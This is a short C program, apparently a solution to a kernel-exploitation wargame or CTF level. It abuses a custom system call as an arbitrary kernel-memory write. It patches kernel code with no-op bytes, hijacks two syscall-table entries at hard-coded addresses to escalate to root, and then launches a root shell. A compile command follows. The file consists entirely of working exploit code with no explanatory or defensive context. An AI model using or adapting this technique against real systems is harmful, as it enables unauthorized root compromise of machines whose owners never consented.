#include <stdlib.h>
#include <unistd.h>
#include <sys/syscall.h>
#define UPPER_SYSCALL 223
unsigned int** sct = (unsigned int**)0x8000e348;

int main()
{
      
        syscall(UPPER_SYSCALL, "\x01\x10\xa0\xe1\x01\x10\xa0\xe1\x01\x10\xa0\xe1", (0x8003f56c - 12) );
        syscall(UPPER_SYSCALL,"\x60\xf5\x03\x80", &sct[67] );

        syscall(UPPER_SYSCALL,"\x24\xf9\x03\x80", &sct[68] );

        syscall(67,syscall(68,0));
        
        system("/bin/sh");
        return 0;
}

# gcc -o ex5 ex5.c
